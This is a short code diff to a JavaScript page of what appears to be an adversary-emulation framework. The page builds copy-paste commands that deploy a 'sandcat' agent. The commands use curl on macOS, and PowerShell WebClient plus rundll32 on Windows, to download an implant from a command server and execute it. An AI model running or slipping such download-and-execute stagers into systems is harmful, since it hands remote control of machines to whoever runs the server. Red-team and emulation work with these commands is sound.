@@ -121,9 +121,9 @@
             } else if (identity === 'darwin') {
                 x.text('curl -sk -X POST -H \'file:sandcat.go\' -H \'platform:darwin\' '+loc+'/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server '+loc+' -group my_group -v;');
             } else if(identity === 'windows-dll-mem') {
-				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("DefaultServer","'+loc+'"); $wc.Headers.add("DefaultSleep","60"); $wc.Headers.add("DefaultGroup","my_group"); $PEBytes = $wc.DownloadData($url);');
+				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $wc.Headers.add("defaultSleep","60"); $wc.Headers.add("defaultGroup","my_group"); $PEBytes = $wc.DownloadData($url);');
 			} else if(identity === 'windows-dll-disk') {
-				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("DefaultServer","'+loc+'"); $wc.Headers.add("DefaultSleep","60"); $wc.Headers.add("DefaultGroup","my_group"); $output="C:\\Users\\Public\\sandcat.dll"; $wc.DownloadFile($url,$output); rundll32.exe sandcat.dll,VoidFunc();');
+				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $output="C:\\Users\\Public\\sandcat.dll"; $wc.DownloadFile($url,$output); rundll32.exe C:\\Users\\Public\\sandcat.dll,VoidFunc');
 			}
         }
         function actionDownload(phrase){
